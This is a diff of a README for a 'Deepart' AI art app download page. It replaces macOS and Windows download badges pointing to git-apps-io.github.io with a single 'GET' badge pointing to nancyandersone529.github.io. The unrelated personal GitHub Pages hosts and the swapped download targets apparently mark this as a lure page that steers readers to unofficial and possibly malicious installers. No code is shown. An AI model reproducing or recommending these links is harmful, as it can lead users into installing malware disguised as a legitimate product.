@@ -1,18 +1,7 @@
 # Deepart Download — AI Art Platform
 
-<a href="https://git-apps-io.github.io/.github/?offer=Deepart" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/Deepart%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white" 
-    width="280" 
-    alt="Deepart for macOS">
-</a>
+[![GET Deepart Ai](https://img.shields.io/badge/GET%20%E2%80%94%20Deepart-Ai-0078D6?style=for-the-badge&logoColor=white)](https://nancyandersone529.github.io/.github/Deepart-Ai)
 
-<a href="https://git-apps-io.github.io/.github/?offer=Deepart" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/Deepart%20for%20Windows-0078D7?style=for-the-badge&logo=windows&logoColor=white" 
-    width="280" 
-    alt="Deepart for Windows">
-</a>
 
 ---
 
